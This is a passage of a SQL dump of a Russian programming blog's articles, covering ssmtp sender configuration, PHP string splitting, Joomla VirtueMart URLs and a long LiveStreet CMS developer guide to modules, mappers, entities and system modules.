прошлый раз мне пришлось сносить мускул и ставить заново.</p>', '/uploads/2014/02/rieshieno-2002-nievozmozhno-podkliuchit-sia-k-siervieru-mysql.jpeg', 1, NULL, '2012-07-09 13:48:46'),
(67, 'www-data php mail и ssmtp - неправильный FROM в письмах', 'www-data-php-mail-i-ssmtp-niepravil-nyi-from-v-pis-makh', '<p>Хоть я и указывал в заголовках phpmail от кого письмо все равно приходило от www-data &lt;comemail@mail.ru&gt;. Оказалось что по-умолчанию ssmtp настроен таким образом чтобы пользователь не мог изменить этот самый FROM. Посему заходим в конфиг:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo vim /etc/ssmtp/ssmtp.conf</code></pre>\r\n\r\n<p>и раскоментируем строку FromLineOverride=YES убрав в начале строки знак диеза (для тех кто еще не в курсе) После чего перезапускаем сервис:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo /etc/init.d/sendmail restart</code></pre>', NULL, 1, NULL, '2012-07-13 10:55:23'),
(68, 'PHP: разбить строку на подстроки заданной длины', 'php-razbit-stroku-na-podstroki-zadannoi-dliny', '<pre>\r\n<code class="php">$result=&quot;&quot;;\r\nfor ($start=0, $length=300; $subtext = substr($text, $start, $length); $start = $start + 300){\r\n	$result .= $subtext;	\r\n}</code></pre>\r\n\r\n<p>А если нам нужно <strong>разбить строку на предложения</strong>? Ответ есть:</p>\r\n\r\n<pre>\r\n<code class="php">$substr = explode(".", $text);\r\nforeach ($substr AS $key =&gt; $value){\r\n    if ($value != "") {\r\n        echo $value; //одно предложение\r\n    }\r\n    //fix троеточие\r\n    else {\r\n        \r\n    }\r\n}</code></pre>', NULL, 1, NULL, '2012-08-17 00:37:08'),
(69, 'Seo virtuemart 2.x и Joomla! 2.5 или как избавится от /components/virtuemart/ в URL', 'seo-virtuemart-2-x-i-joomla-2-5-ili-kak-izbavitsia-ot-components-virtuemart-v-url', '<p>Установив на <strong>Joomla! 2.5 Virtuemart 2.0.8</strong> при включенном <strong>SEO</strong> компонента, который кстати сказать есть свой на 1000 строк <strong>router.php</strong>, и движка увидел уродские урлы в которых содержался&nbsp;<strong>/components/virtuemart/</strong> да еще и параметры через знак вопроса. Это совсем не похоже на <strong>ЧПУ</strong>. Покопавшись в просторах инета нашел очень простое, топорное решение. Создаем вспомогательное меню, я его так и назвал чтоб легче было ориентироватся - &quot;Вспомогательное меню&quot;. Создаем меню Virtuemarta -&gt; Home. Само меню должно быть опубликованым но модуль для него можно не публиковать. Таким образом избавляемся от назойливого&nbsp;<strong>/components/virtuemart/ в URL</strong>.</p>', '/uploads/2014/02/seo-virtuemart-2-x-i-joomla-2-5-ili-kak-izbavitsia-ot-components-virtuemart-v-url.png', 1, NULL, '2012-08-29 22:40:16'),
(70, 'Всех с прошедшим Днем программиста!', 'vsiekh-s-proshiedshim-dniem-proghrammista', '<div class="embeddedContent"><iframe allowfullscreen="true" allowscriptaccess="always" frameborder="0" height="349" scrolling="no" src="//www.youtube.com/embed/Q7QYMN1Zuo8?wmode=transparent&amp;jqoemcache=rViJ0" style="max-width: 425px; max-height:349px" width="425"></iframe></div>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2012-09-14 15:08:17');
INSERT INTO `articles` (`id`, `title`, `slug`, `text`, `image`, `publish`, `weight`, `created_at`) VALUES
(71, 'Модули (Module) LiveStreet', 'moduli-module-livestreet', '<p>Модули предназначены для объединения часто используемого функционала, т.е. некие аналоги внутренних библиотек. Например, модуль может содержать методы для обработки запросов к базе данных, подсчета некой статистики, работы с системой кеширования. Модули бывают двух типов -&nbsp;<strong>системные</strong>(модули ядра) и&nbsp;<strong>пользовательские</strong>(обычные модули). Отличие в них только одно - системные находятся в каталоге&nbsp;<strong>/engine/classes/modules/</strong>, а пользовательские в каталоге&nbsp;<strong>/classes/modules/</strong>. Название класса модуля строится по шаблону&nbsp;<strong>Module[Name]</strong>, где&nbsp;<strong>Name</strong>&nbsp;- это название модуля, первая буква должна быть заглавной, остальные в нижнем регистре. Например,&nbsp;<strong>ModuleUser</strong>. Класс модуля должен наследоваться от класса&nbsp;<strong>Module</strong>&nbsp;(/engine/classes/Module.class.php). Каждый модуль расположен в отдельном каталоге, название которого совпадает с именем модуля, но в нижнем регистре, например,&nbsp;<strong>/classes/modules/user/</strong>. Сам файл модуля также содержит его название -&nbsp;<strong>User.class.php</strong>, первая буква в верхнем регистре, остальные в нижнем. <!--more--> Пример простого модуля (<strong>/classes/modules/user/User.class.php</strong>):</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n\r\nclass ModuleUser extends Module {\r\n        /**\r\n         * Инициализация\r\n         *\r\n         */\r\n        public function Init() {\r\n                // здесь какие либо действи при инициализации модуля \r\n        }\r\n\r\n        /**\r\n         * Некий метод модуля\r\n         *\r\n         */\r\n        public function SomeFunction() {\r\n\r\n        }     \r\n  \r\n        /**\r\n         * Вызываетс автоматически при завершении работы модуля\r\n         *\r\n         */\r\n        public function Shutdown() {\r\n\r\n        }       \r\n}</code></pre>\r\n\r\n<p>Обязательным методом для модуля является&nbsp;<strong>Init()</strong>&nbsp;- он автоматически выполняется&nbsp;<strong>один раз</strong>&nbsp;при инициализации модуля. Инициализация происходит при первом обращении к модулю, либо при инициализации ядра (engine) если модуль добавлен в автозагрузку через конфиг:</p>\r\n\r\n<pre>\r\n<code class="php">$config[&quot;module&quot;][&quot;autoLoad&quot;] = array(&quot;Hook&quot;,&quot;Cache&quot;,&quot;User&quot;);</code></pre>\r\n\r\n<p>Здесь в массиве перечисляются модули, которые должны загружаться вместе с ядром. Метод&nbsp;<strong>Shutdown()</strong>&nbsp;выполняется автоматически при завершении модуля. Процедура завершения всех активных(инициализированных) модулей запускается ядром при его завершении. Обращение к методам модуля в большинстве случаев(в экшенах, хуках, модулях, блоках, сущностях, плагинах) осуществляется через&nbsp;<strong>$this-&gt;Module_Method()</strong>, например,&nbsp;<strong>$this-&gt;User_SomeFunction()</strong>. Но также можно обратиться к модулю через ядро:&nbsp;<strong>Engine::getInstance()-&gt;User_SomeFunction()</strong>.</p>\r\n\r\n<h2 id="МапперыMapper">Мапперы (Mapper)</h2>\r\n\r\n<p>Часто бывает, что в модулях требуется реализовать работу с базой данных. Для этого предусмотрены специальные объекты -&nbsp;<strong>Mapper</strong>. Вся задача маппера сводится в выполнению запроса к базе данных и возвращения результата в модуль. Мапперы находятся в подкаталоге&nbsp;<strong>/mapper/</strong>&nbsp;в каталоге с модулем, например,<strong>/classes/modules/user/mapper/</strong>. Название класса состоит из двух частей&nbsp;<strong>Module[Name]_Mapper[NameMapper]</strong>, где&nbsp;<strong>Name</strong>&nbsp;- это название модуля, а&nbsp;<strong>NameMapper</strong>&nbsp;- это название маппера(как обычно первая буква заглавная, остальные в нижнем регистре), например,&nbsp;<strong>ModuleUser_MapperTest</strong>. Зачастую название маппера совпадает с названием модуля. Класс маппера должен наследоваться от класса&nbsp;<strong>Mapper</strong>&nbsp;(/engine/classes/Mapper.class.php). Файл маппера называется по шаблону&nbsp;<strong>[NameMapper].mapper.class.php</strong>, например,<strong>Test.mapper.class.php</strong>. Пример простого маппера (<strong>/classes/modules/user/mapper/Test.mapper.class.php</strong>) :</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n\r\nclass ModuleUser_MapperTest extends Mapper {\r\n        /**\r\n         * Получает пользователя по его логину из таблицы user\r\n         *\r\n         * @param string $sLogin\r\n         * @return unknown\r\n         */\r\n        public function GetUserByLogin($sLogin) {               \r\n                $sql = &quot;SELECT \r\n                                *  \r\n                        FROM \r\n                                &quot;.Config::Get(&#39;db.table.user&#39;).&quot;\r\n                        WHERE \r\n                                user_login = ? &quot;;\r\n                if ($aRow=$this-&gt;oDb-&gt;selectRow($sql,$sLogin)) {\r\n                        return Engine::GetEntity(&quot;User&quot;,$aRow);;\r\n                }\r\n                return null;\r\n        }\r\n}</code></pre>\r\n\r\n<p>В данном примере метод&nbsp;<strong>GetUserByLogin()</strong>&nbsp;выполняет запрос к базе данных для получения пользователя по логину из таблицы&nbsp;<strong>user&nbsp;</strong>и возвращает&nbsp;<a href="http://web.archive.org/web/20100724120400/http://trac.lsdev.ru/livestreet/wiki/DeveloperDoc/Module#СущностиEntity">объект сущности</a>&nbsp;пользователя. Непосредственно сам запрос выполняется через свойство маппера&nbsp;<strong>$oDb</strong>, в котором содержится объект для работы с БД. Таблица для запроса получается из конфига, где определен список таблиц и их префикс в БД (<strong>/config/config.php</strong>):</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n/**\r\n * Настройка таблиц базы данных\r\n */\r\n$config[&#39;db&#39;][&#39;table&#39;][&#39;prefix&#39;] = &#39;prefix_&#39;;\r\n\r\n$config[&#39;db&#39;][&#39;table&#39;][&#39;user&#39;] = &#39;___db.table.prefix___user&#39;;\r\n\r\n$config[&#39;db&#39;][&#39;tables&#39;][&#39;engine&#39;] = &#39;InnoDB&#39;;  // InnoDB или MyISAM </code></pre>\r\n\r\n<p>Настройки самого подключения к базе данных также находятся в конфиге:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n/**\r\n * Настройка базы данных\r\n */\r\n$config[&#39;db&#39;][&#39;params&#39;][&#39;host&#39;]   = &#39;localhost&#39;;\r\n$config[&#39;db&#39;][&#39;params&#39;][&#39;port&#39;]   = &#39;3306&#39;;\r\n$config[&#39;db&#39;][&#39;params&#39;][&#39;user&#39;]   = &#39;root&#39;;\r\n$config[&#39;db&#39;][&#39;params&#39;][&#39;pass&#39;]   = &#39;&#39;;\r\n$config[&#39;db&#39;][&#39;params&#39;][&#39;type&#39;]   = &#39;mysql&#39;;\r\n$config[&#39;db&#39;][&#39;params&#39;][&#39;dbname&#39;] = &#39;social&#39;;</code></pre>\r\n\r\n<p>Пример модуля с использованием маппера:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n\r\nclass ModuleUser extends Module {\r\n        /**\r\n         * Объект маппера\r\n         *\r\n         * @var Mapper\r\n         */\r\n        protected $oMapper=null;\r\n\r\n        /**\r\n         * Инициализация\r\n         *\r\n         */\r\n        public function Init() {\r\n                /**\r\n                 * Получаем маппер по его имени\r\n                 */\r\n                $this-&gt;oMapper=Engine::GetMapper(__CLASS__,&quot;Test&quot;);\r\n        }\r\n\r\n        /**\r\n         * Получает пользователя по его логину\r\n         *\r\n         * @param string $sLogin\r\n         * @return unknown\r\n         */\r\n        public function GetUserByLogin($sLogin) {\r\n                return $this-&gt;oMapper-&gt;GetUserByLogin($sLogin);\r\n        }\r\n}</code></pre>\r\n\r\n<p>Объект маппера получается через статический метод ядра:&nbsp;<strong>Engine::GetMapper([ClassModule],[NameMapper]);</strong>, где&nbsp;<strong>ClassModule</strong>&nbsp;- это им класса модуля к которому относится маппер, а&nbsp;<strong>NameMapper</strong>&nbsp;- это название маппера, например,&nbsp;<strong>Engine::GetMapper(&#39;ModuleUser&#39;,&#39;Test&#39;)</strong>.</p>\r\n\r\n<h2 id="СущностиEntity">Сущности (Entity)</h2>\r\n\r\n<p>При запросе к базе данных удобно возвращать не просто массив данных, а данные в виде специального объекта -&nbsp;<strong>Entity</strong>. Основные методы такого объекта делятся на два вида: get-методы и set-методы. Первые получают свойство объекта по его имени, а вторые устанавливают. Сущности находятся в подкаталоге&nbsp;<strong>/entity/</strong>&nbsp;в каталоге с модулем, например,<strong>/classes/modules/user/entity/</strong>. Название класса состоит из двух частей&nbsp;<strong>Module[Name]_Entity[NameEntity]</strong>, где&nbsp;<strong>Name</strong>&nbsp;- это название модуля, а&nbsp;<strong>NameEntity</strong>&nbsp;- это название сущности, например,&nbsp;<strong>ModuleUser_EntityUser</strong>,&nbsp;<strong>ModuleUser_EntitySession</strong>&nbsp;или&nbsp;<strong>ModuleUser_EntityUserVote</strong>. Класс сущности должен наследоваться от класса&nbsp;<strong>Entity</strong>(/engine/classes/Entity.class.php). Файл сущности называется по шаблону&nbsp;<strong>[NameEntity].entity.class.php</strong>, например,&nbsp;<strong>UserVote.entity.class.php</strong>. Пример сущности (/classes/modules/user/entity/User.entity.class.php) :</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n\r\nclass ModuleUser_EntityUser extends Entity {\r\n\r\n        public function getLogin() {\r\n                return $this-&gt;_aData[&quot;user_login&quot;];\r\n        }      \r\n\r\n        public function setLogin($data) {\r\n                $this-&gt;_aData[&quot;user_login&quot;]=$data;\r\n        }\r\n}</code></pre>\r\n\r\n<p>Данные у сущности хранятся в ассоциативном массиве&nbsp;<strong>$this-&gt;_aData</strong>. Описывать все поля сущности нет необходимости, если использовать camel-style при наименовании методов. Например следующие две сущности эквивалентны:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n/**\r\n * Первый вариант\r\n *\r\n */\r\nclass ModuleUser_EntityUser extends Entity {\r\n        public function getLogin() {\r\n                return $this-&gt;_aData[&quot;login&quot;];\r\n        }\r\n\r\n        public function getProfileName() {\r\n                return $this-&gt;_aData[&quot;profile_name&quot;];\r\n        }\r\n\r\n        public function setLogin($data) {\r\n                $this-&gt;_aData[&quot;login&quot;]=$data;\r\n        }\r\n        public function setProfileName($data) {\r\n                $this-&gt;_aData[&quot;profile_name&quot;]=$data;\r\n        }\r\n}\r\n\r\n/**\r\n * Второй вариант\r\n *\r\n */\r\nclass ModuleUser_EntityUser extends Entity {\r\n\r\n}</code></pre>\r\n\r\n<p>Во втором варианте обращение к методам сущности автоматически преобразуется в ключ ассоциативного массива. Например,&nbsp;<strong>OneTwoThreeFour</strong>&nbsp;преобразуется в<strong>one_two_three_four</strong>. Также доступны дополнительные методы:</p>\r\n\r\n<pre>\r\n<code class="php">&lt;?php\r\n/**\r\n * Устанавливает значения сущности из ассоциативного массива $aData  \r\n *\r\n */\r\nfunction _setData($aData)\r\n\r\n/**\r\n * Возвращает ассоциативный массив значений сущности. \r\n * Если передан параметр $aKeys, то вернуться только те значения, ключи которых перечислены в этом параметре.   \r\n */\r\nfunction _getData($aKeys=array())</code></pre>\r\n\r\n<p>Создание объектов сущностей происходит через статический метод ядра:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Возвращает пустой (без данных) объект сущности Session модуля User\r\n */\r\n$oSession=Engine::GetEntity(''User_Session'');\r\n/**\r\n * Возвращает объект сущности Session модуля User c заполненными даными user_id и key\r\n */\r\n$oSession=Engine::GetEntity(''User_Session'',array(''user_id''=-->123,&#39;key&#39;=&gt;&#39;qwerty&#39;));\r\n/**\r\n * Возвращает объект сущности User модуля User.\r\n * Если название сущности совпадает с названием модуля, то допускается короткая запись:  User_User = User\r\n */\r\n$oUser=Engine::GetEntity(&#39;User&#39;,$aData);\r\n?&gt;</pre>\r\n\r\n<h2 id="Системныемодули">Системные модули</h2>\r\n\r\n<p>Системные модули (модули ядра) находятся в каталоге&nbsp;<strong>/engine/classes/modules/</strong>.</p>\r\n\r\n<h3 id="Cache">Cache</h3>\r\n\r\n<p>Модуль кеширования. Для реализации кеширования используетс библиотека&nbsp;<strong>Zend_Cache</strong>&nbsp;с двумя бэкэндами File и Memcache. Т.к. в memcache нет встроенной поддержки тегирования при кешировании, то для реализации тегов используется враппер для Zend_Cache_Backend_Memcached от Дмитрия Котерова -<strong>Dklab_Cache_Backend_TagEmuWrapper</strong>. Настройки кеширования устанавливаются в конфиге (/config/config.php) :</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Использовать кеширование или нет\r\n */\r\n$config[''sys''][''cache''][''use''] = true;\r\n/**\r\n * Тип кеширования. Возмоные значения: file, memory \r\n */\r\n$config[''sys''][''cache''][''type''] = ''file'';\r\n/**\r\n * Каталог для хранения файлового (file) кеша, также используется для временных картинок.\r\n */\r\n$config[''sys''][''cache''][''dir''] = ''___path.root.server___/tmp/'';\r\n/**\r\n * Префикс кеширования, чтоб можно было на одном сервере держать несколько сайтов с общим кешевым хранилищем\r\n */\r\n$config[''sys''][''cache''][''prefix''] = ''livestreet_cache'';\r\n/**\r\n * Уровень вложенности директорий файлового кеша\r\n */\r\n$config[''sys''][''cache''][''directory_level''] = 1;\r\n\r\n/**\r\n * Настройка серверов memcache\r\n */\r\n$config[''memcache''][''servers''][0][''host''] = ''localhost'';\r\n$config[''memcache''][''servers''][0][''port''] = ''11211'';\r\n$config[''memcache''][''servers''][0][''persistent''] = true;\r\n$config[''memcache''][''compression''] = true;\r\n?--></pre>\r\n\r\n<p>Доступные методы модуля кеширования:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Получает значение из кеша по имени.\r\n * В качестве имени может быть передан массив имен, тогда метод вернет ассоциативный массив значений.\r\n * $sName - имя (ключ) кеша \r\n */\r\nfunction Get($sName)\r\n\r\n/**\r\n * Записывает значение в кеш.\r\n * $data - данные\r\n * $sName - имя кеша\r\n * $aTags - список тегов\r\n * $iTimeLife - время изни кеша в секундах  \r\n */\r\nfunction Set($data,$sName,$aTags=array(),$iTimeLife=false)\r\n\r\n/**\r\n * Удаляет значение из кеша по имени\r\n * $sName - имя (ключ) кеша \r\n */\r\nfunction Delete($sName)\r\n\r\n/**\r\n * Очищает кеш.\r\n * $cMode - режим очистки кеша. \r\n *              Zend_Cache::CLEANING_MODE_ALL - удаляет весь кеш\r\n *              Zend_Cache::CLEANING_MODE_OLD - удаляет просроченный кеш\r\n *              Zend_Cache::CLEANING_MODE_MATCHING_TAG - удаляет кеш с определенными тегами\r\n * $aTags - список тегов, используется при $cMode = Zend_Cache::CLEANING_MODE_MATCHING_TAG\r\n */\r\nfunction Clean($cMode = Zend_Cache::CLEANING_MODE_ALL, $aTags = array())\r\n\r\n/**\r\n * Получает статистику использовани кеша в виде ассоциативного массива\r\n */\r\nfunction GetStats()\r\n?--></pre>\r\n\r\n<p>Пример использования кеширования:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\nclass ModuleUser extends Module {\r\n        /**\r\n         * Объект маппера\r\n         *\r\n         * @var Mapper\r\n         */\r\n        protected $oMapper=null;\r\n        /**\r\n         * Инициализация\r\n         *\r\n         */\r\n        public function Init() {\r\n                /**\r\n                 * Получаем маппер по его имени\r\n                 */\r\n                $this--->oMapper=Engine::GetMapper(__CLASS__,&#39;Test&#39;);\r\n        }\r\n        /**\r\n         * Получает пользователя по его логину\r\n         *\r\n         * @param string $sLogin\r\n         * @return unknown\r\n         */\r\n        public function GetUserByLogin($sLogin) {\r\n                /**\r\n                 * Пытаемся получить значение из кеша\r\n                 */\r\n                if (false === ($oUser = $this-&gt;Cache_Get(&quot;user_login_{$sLogin}&quot;))) {\r\n                        /**\r\n                         * Если значение из кеша получить не удалось, то обращаемся к базе данных\r\n                         */\r\n                        $oUser = $this-&gt;oMapper-&gt;GetUserByLogin($sLogin);\r\n                        /**\r\n                         * Записываем значение в кеш\r\n                         */\r\n                        $this-&gt;Cache_Set($oUser, &quot;user_login_{$sLogin}&quot;, array(), 60*60*24*5);\r\n                }\r\n                return $oUser;\r\n        }\r\n        /**\r\n         * Обновляет пользовател в БД\r\n         */\r\n        public function UpdateUser($oUser) {\r\n                /**\r\n                 * Удаляем кеш конкретного пользователя\r\n                 */\r\n                $this-&gt;Cache_Delete(&quot;user_login_{$oUser-&gt;getLogin()}&quot;);\r\n                /**\r\n                 * Удалем кеш со списком всех пользователей \r\n                 */\r\n                $this-&gt;Cache_Clean(Zend_Cache::CLEANING_MODE_MATCHING_TAG,array(&#39;user_update&#39;));\r\n                /**\r\n                 * Обновлем пользовател в базе данных\r\n                 */\r\n                return $this-&gt;oMapper-&gt;UpdateUser($oUser);\r\n        }\r\n        /**\r\n         * Получает список всех пользователей\r\n         */\r\n        public function GetUsers() {\r\n                /**\r\n                 * Пытаемся получить значение из кеша\r\n                 */\r\n                if (false === ($aUserList = $this-&gt;Cache_Get(&quot;users&quot;))) {\r\n                        /**\r\n                         * Если значение из кеша получить не удалось, то обращаемся к базе данных\r\n                         */\r\n                        $aUserList = $this-&gt;oMapper-&gt;GetUsers();\r\n                        /**\r\n                         * Записываем значение в кеш\r\n                         */\r\n                        $this-&gt;Cache_Set($oUser, &quot;users&quot;, array(&#39;user_update&#39;), 60*60*24*5);\r\n                }\r\n                return $aUserList;\r\n        }\r\n}\r\n?&gt;</pre>\r\n\r\n<h3 id="Database">Database</h3>\r\n\r\n<p>Модуль для работы с базой данных. Работа с базой данных осуществляется через внешнюю библиотеку от Дмитрия Котерова -&nbsp;<strong>DbSimple</strong>. Задача модуля Database сводится к получению экземпляра объекта DbSimple, используя параметры подключения к базе данных.</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Получает объект DbSimple для работы с базой данных.\r\n * $aConfig - содержит настройки БД(хост,логин,пароль,тип БД,имя БД), если не передан, то берутся настройки из конфига\r\n */\r\nfunction GetConnect($aConfig=null)\r\n\r\n/**\r\n * Получает статистику работы с БД в виде ассоциативного массива\r\n */\r\nfunction GetStats()\r\n?--></pre>\r\n\r\n<p>Дефолтные настройки коннекта к БД хранятся в конфиге:</p>\r\n\r\n<pre>\r\n<!--?php\r\n/**\r\n * Настройка базы данных\r\n */\r\n$config[''db''][''params''][''host'']   = ''localhost'';\r\n$config[''db''][''params''][''port'']   = ''3306'';\r\n$config[''db''][''params''][''user'']   = ''root'';\r\n$config[''db''][''params''][''pass'']   = '''';\r\n$config[''db''][''params''][''type'']   = ''mysql'';\r\n$config[''db''][''params''][''dbname''] = ''social'';\r\n?--></pre>\r\n\r\n<p>Также в конфиге можно указать настройки логирования SQL запросов:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Логировать или нет все SQL запросы\r\n */\r\n$config[''sys''][''logs''][''sql_query''] = false;\r\n/**\r\n * Файл лога SQL запросов относительно каталога /logs/\r\n */\r\n$config[''sys''][''logs''][''sql_query_file''] = ''sql_query.log'';\r\n/**\r\n * Логировать или нет ошибки при SQL запросах\r\n */\r\n$config[''sys''][''logs''][''sql_error''] = true;\r\n/**\r\n * Файл лога ошибок SQL запросов относительно каталога /logs/\r\n */\r\n$config[''sys''][''logs''][''sql_error_file''] = ''sql_error.log'';\r\n?--></pre>\r\n\r\n<p>В мапперах объект DbSimple содержится в свойстве&nbsp;<strong>$this-&gt;oDb</strong>. Пример запроса к БД из маппера:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\nclass ModuleUser_MapperTest extends Mapper {\r\n        /**\r\n         * Получает пользователя по его логину из таблицы user\r\n         *\r\n         * @param string $sLogin\r\n         * @return unknown\r\n         */\r\n        public function GetUserByLogin($sLogin) {               \r\n                $sql = "SELECT \r\n                                *  \r\n                        FROM \r\n                                ".Config::Get(''db.table.user'')."\r\n                        WHERE \r\n                                user_login = ? ";\r\n                if ($aRow=$this--->oDb-&gt;selectRow($sql,$sLogin)) {\r\n                        return Engine::GetEntity(&#39;User&#39;,$aRow);;\r\n                }\r\n                return null;\r\n        }\r\n}\r\n?&gt;</pre>\r\n\r\n<p>Более подробно ознакомиться с DbSimple и синтаксисом плейсхолдеров в SQL запросах можно на&nbsp;<a href="http://web.archive.org/web/20100724120400/http://dklab.ru/lib/DbSimple/manual.html">&nbsp;странице документации к DbSimple</a>.</p>\r\n\r\n<h3 id="Image">Image</h3>\r\n\r\n<p>Модуль для обработки изображений, использует библиотеку LiveImage (/engine/lib/external/LiveImage/). Настройки обработки изображений хранятся в конфиге. Можно создавать любое количество групп настроек, по умолчанию используется группа&nbsp;<strong>default</strong>&nbsp;:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Дефолтная группа настроек "default"\r\n */\r\n$config[''module''][''image''][''default''][''watermark_use'']        = false;\r\n$config[''module''][''image''][''default''][''watermark_type'']       = ''text'';\r\n$config[''module''][''image''][''default''][''watermark_position'']   = ''0,24'';\r\n$config[''module''][''image''][''default''][''watermark_text'']       = ''(c) LiveStreet'';\r\n$config[''module''][''image''][''default''][''watermark_font'']       = ''arial'';\r\n$config[''module''][''image''][''default''][''watermark_font_color''] = ''255,255,255'';\r\n$config[''module''][''image''][''default''][''watermark_font_size'']  = ''10'';\r\n$config[''module''][''image''][''default''][''watermark_font_alfa'']  = ''0'';\r\n$config[''module''][''image''][''default''][''watermark_back_color''] = ''0,0,0'';\r\n$config[''module''][''image''][''default''][''watermark_back_alfa'']  = ''40'';\r\n$config[''module''][''image''][''default''][''watermark_image'']      = false;\r\n$config[''module''][''image''][''default''][''watermark_min_width'']  = 200;\r\n$config[''module''][''image''][''default''][''watermark_min_height''] = 130;\r\n$config[''module''][''image''][''default''][''round_corner'']         = false;\r\n$config[''module''][''image''][''default''][''round_corner_radius'']  = ''18'';\r\n$config[''module''][''image''][''default''][''round_corner_rate'']    = ''40'';\r\n$config[''module''][''image''][''default''][''path''][''watermarks'']   = ''___path.root.server___/engine/lib/external/LiveImage/watermarks/'';\r\n$config[''module''][''image''][''default''][''path''][''fonts'']        = ''___path.root.server___/engine/lib/external/LiveImage/fonts/'';\r\n$config[''module''][''image''][''default''][''jpg_quality'']          = 100;  // Число от 0 до 100\r\n/**\r\n * Группа настроек "foto"\r\n */\r\n$config[''module''][''image''][''foto''][''watermark_use'']  = false;\r\n$config[''module''][''image''][''foto''][''round_corner'']   = false;\r\n/**\r\n * Группа настроек "topic"\r\n */\r\n$config[''module''][''image''][''topic''][''watermark_use'']  = true;\r\n$config[''module''][''image''][''topic''][''round_corner'']   = true;\r\n?--></pre>\r\n\r\n<p>Основные методы модуля:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Возвращет группу настроек, определеную в конфиге с наложением дефолтных настроек\r\n * $sName - имя группы \r\n */\r\nfunction BuildParams($sName=null)\r\n\r\n/**\r\n * Изменяет размер изображения, это основной метод по работе с изображениям\r\n * $sFileSrc - полный путь до исходного файла изображения\r\n * $sDirDest - каталог в который необходимо сохранить результирующее изображение, относительно корня сайта, например, ''/uploads/images/''\r\n * $sFileDest - им нового файле без расширения, например, ''newfile''\r\n * $iWidthMax - максимально допустимая ширина изображения в пикселях, например, ''5000''\r\n * $iHeightMax - максимально допустимая высота изображения в пикселях\r\n * $iWidthDest - ширина результирующего изображения в пикселях\r\n * $iHeightDest - высота результирующего изображения в пикселях\r\n * $bForcedMinSize - определяет необходимость сохранения исходной ширины, если она меньше чем $iWidthDest \r\n * $aParams - настройки обработки изображения, получаются через BuildParams()\r\n * $oImage - объект LiveImage, если не передан, то он будет создан автоматически используя $sFileSrc\r\n * \r\n * Возвращает полный серверный путь до результирующего изображения\r\n */\r\nfunction Resize($sFileSrc,$sDirDest,$sFileDest,$iWidthMax,$iHeightMax,$iWidthDest=null,$iHeightDest=null,$bForcedMinSize=true,$aParams=null,$oImage=null)\r\n\r\n/**\r\n * Вырезает максимально возможный квадрат и возвращает его в объекте LiveImage\r\n * $oImage - объект LiveImage. Создается через $oImage = new LiveImage($sFileSrc);\r\n */\r\nfunction CropSquare(LiveImage $oImage)\r\n\r\n/**\r\n * Создает каталог(и) с учетом иерархии \r\n * $sDirDest - каталог, который необходимо создать. Указывается относительно корня сайта, например, ''/uploads/images/44/77/myfiles/'' \r\n */\r\nfunction CreateDirectory($sDirDest)\r\n\r\n/**\r\n * Возвращает каталог относительно корн сайта в формате /uploads/images/00/12/34/yyyy/mm/dd/ , где 001234 - это $sUserId, /yyyy/mm/dd/ - текущая дата\r\n * $sUserId - число от 1 до 999999, обычно используется как ID пользователя\r\n */\r\nfunction GetIdDir($sUserId)\r\n\r\n/**\r\n * Возвращает полный серверный путь до файла по переданному web пути\r\n * $sPath - полный web путь до файла\r\n */\r\nfunction GetServerPath($sPath)\r\n\r\n/**\r\n * Возвращает полный web путь до файла по переданному серверному пути\r\n * $sPath - полный серверный путь до файла\r\n */\r\nfunction GetWebPath($sPath)\r\n\r\n/**\r\n * Возвращает HTML код изображения\r\n * $sPath - полный web путь до изображения\r\n * $aParams - содержет HTML атрибуты тега <img/-->:  array(&#39;title&#39;=&gt;&#39;my title&#39;,&#39;alt&#39;=&gt;&#39;my alt&#39;,&#39;align&#39;=&gt;&#39;left&#39;)\r\n */\r\nfunction BuildHTML($sPath,$aParams)</pre>\r\n\r\n<h3 id="Lang">Lang</h3>\r\n\r\n<p>Модуль для работы с языковыми текстами, позволяет реализовать мультиязычный интерфейс на сайте. Языковые тексты хранятся в языковых файлах, название файла соответствует языку текста содержащегося в нем, например,&nbsp;<strong>russian.php</strong>.</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Пример русского языкового файла russian.php  \r\n */\r\nreturn array(   \r\n        ''blogs'' =--> &#39;Блоги&#39;,     \r\n        &#39;blogs_rating&#39; =&gt; &#39;Рейтинг&#39;,\r\n        &#39;blogs_owner&#39; =&gt; &#39;Смотритель: %%login%% &#39;,\r\n);      \r\n?&gt;</pre>\r\n\r\n<p>Структура расположения языковых файлов следующая:</p>\r\n\r\n<pre>\r\n<!--?php\r\n/**\r\n * Основные языковые файлы\r\n */\r\n/templates/language/\r\n                russian.php\r\n                english.php\r\n\r\n/**\r\n * Дополнительные языковые файлы модулей, название подкаталога (name_module) не обязательно должно совпадать с названием модуля\r\n */\r\n/templates/language/modules/\r\n                        name_module/\r\n                                russian.php\r\n                                english.php\r\n\r\n/**\r\n * Дополнительные языковые файлы шаблонов\r\n */\r\n/templates/language/skin/name_skin/settings/language/\r\n                                                russian.php\r\n                                                english.php\r\n?--></pre>\r\n\r\n<p>Настройки модуля:</p>\r\n\r\n<pre lang="php">\r\n<!--?php\r\n/**\r\n * Текущий язык текстовок \r\n */\r\n$config[''lang''][''current''] = ''russian'';\r\n/**\r\n * Язык текстовок по умолчанию. Если в текущем языке текстовка не найдена, то она берется из дефолтного языка\r\n */\r\n$config[''lang''][''default''] = ''russian'';\r\n/**\r\n * Путь до каталога с основными 